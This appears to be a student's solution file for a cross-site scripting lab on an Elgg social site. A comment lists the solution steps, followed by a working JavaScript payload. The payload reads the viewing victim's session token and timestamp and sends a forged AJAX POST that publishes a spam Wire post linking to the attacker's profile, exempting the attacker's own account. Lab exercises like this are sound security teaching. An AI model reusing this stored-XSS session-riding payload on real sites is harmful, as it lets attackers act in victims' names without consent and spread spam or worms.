/* task3: Posting on the Wire on Behalf of the Victim */

/*
	solution:
		1) The url for the attacker's profile was collected and the post content was created according to the specification.
		2) Then, in "The Wire" section, the prepared content was posted.
		3) An HTTP POST request corresponding to this wire post was detected using HTTP request inspection tool of Mozilla Firefox browser.
		4) The request url was observed and set as attacking url.
		5) The request body containing all the parameters sent was then examined from "Edit and Resend" option and attacking post content was constructed according to its structure.
		6) Finally, the malicious post was deleted from the attacker's thread.
*/

<script type="text/javascript">
	window.onload = function() {
		/* accessing guid, elgg timestamp, elgg security token of the current user */
		var guid = elgg.session.user.guid;
		var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
		var token = '__elgg_token='+elgg.security.token.__elgg_token;

		/* setting post content */
		var post_content = 'To+earn+12+USD%2FHour%28%21%29%2C+visit+now+http%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy.'

		/* task3: constructing the HTTP POST request(url & content) to post on the wire on behalf of the victim */
        var sendurl = 'http://www.xsslabelgg.com/action/thewire/add';
		var content = token+ts+'&body='+post_content;
		
		/* creating and sending Ajax request to post on the wire on behalf of the victim */
		if(guid !== 47) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
		  	Ajax.open('POST', sendurl, true);
			Ajax.setRequestHeader('Host', 'www.xsslabelgg.com');
			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			Ajax.send(content);
		}
	}
</script>

